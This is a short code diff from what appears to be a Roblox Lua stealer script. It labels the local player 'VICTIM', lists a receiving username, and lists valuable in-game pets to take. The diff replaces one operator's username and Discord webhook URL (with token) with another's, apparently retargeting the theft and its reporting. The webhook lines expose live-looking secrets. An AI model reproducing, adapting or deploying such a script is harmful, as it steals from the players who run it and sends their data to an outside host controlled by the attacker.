@@ -6,8 +6,8 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 
 local VICTIM = Players.LocalPlayer
-local USERNAMES = { "SUMERE4H" }
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1400978772764659712/8D9ZMM-FUIUm_i2oSwc3zaX6FA6wNYK96FHGcH69yh1PmhMt0aMlfJgN9S5veYoypzcY"
+local USERNAMES = { "ZeeS_Farm01" }
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"
 
 local PET_WHITELIST = {
     'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
